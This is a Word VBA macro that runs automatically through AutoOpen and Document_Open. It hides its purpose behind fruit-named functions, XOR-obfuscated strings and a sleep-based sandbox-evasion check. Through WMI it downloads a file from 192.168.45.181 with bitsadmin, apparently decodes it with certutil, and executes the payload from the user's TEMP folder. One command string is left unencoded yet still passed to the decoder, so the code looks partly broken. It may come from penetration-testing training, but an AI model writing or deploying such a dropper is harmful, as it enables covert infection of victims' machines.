Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
Sub calculate()
  Dim tally As Single
  Dim tally2 As Single
  Dim tally3 As Single
  Dim Apples As String
  Dim Water As String
  
  tally = Timer
  Sleep 2200
  tally2 = Timer
  tally3 = tally2 - tally
  If tally3 < 2 Then
    Exit Sub
  End If

  If ActiveDocument.Name <> Nuts("018025021088018025021") Then
    Exit Sub
  End If
  
  Apples = "bitsadmin /Transfer myJob http://192.168.45.181/util.txt"
  Water = Nuts(Apples)
  GetObject(Nuts("001031024027017027002005076")).Get(Nuts("033031024069068041038004025021019005005")).Create Water & Environ(Nuts("034051059038")) & Nuts("042003002031026088002014002"), Tea, Coffee, Napkin
  Sleep 20000
  Apples = "021019004002003002031026086091018019021025018019086"
  Water = Nuts(Apples)
  GetObject(Nuts("001031024027017027002005076")).Get(Nuts("033031024069068041038004025021019005005")).Create Water & Environ(Nuts("034051059038")) & Nuts("042003002031026088002014002086") & Environ(Nuts("034051059038")) & Nuts("042003002031026088019014019"), Tea, Coffee, Napkin
  Sleep 5000
  Apples = "053076042033031024018025001005042059031021004025005025016002088056051034042048004023027019001025004029064066042000066088070088069070069071079042031024005002023026026003002031026088019014019086089026025017016031026019075086089058025017034025053025024005025026019075016023026005019086089035086"
  Water = Nuts(Apples)
  GetObject(Nuts("001031024027017027002005076")).Get(Nuts("033031024069068041038004025021019005005")).Create Water & Environ(Nuts("034051059038")) & Nuts("042003002031026088019014019"), Tea, Coffee, Napkin
End Sub

Function Pears(beets)
  Pears = Chr(beets Xor Asc("v"))
End Function

Function Strawberries(grapes)
  Strawberries = Left(grapes, 3)
End Function

Function Almonds(jelly)
  Almonds = Right(jelly, Len(jelly) - 3)
End Function

Function Nuts(milk)
  Do
    Oatmilk = Oatmilk + Pears(Strawberries(milk))
    milk = Almonds(milk)
  Loop While Len(milk) > 0
  Nuts = Oatmilk
End Function


Sub Document_Open()
  calculate
End Sub

Sub AutoOpen()
  calculate
End Sub

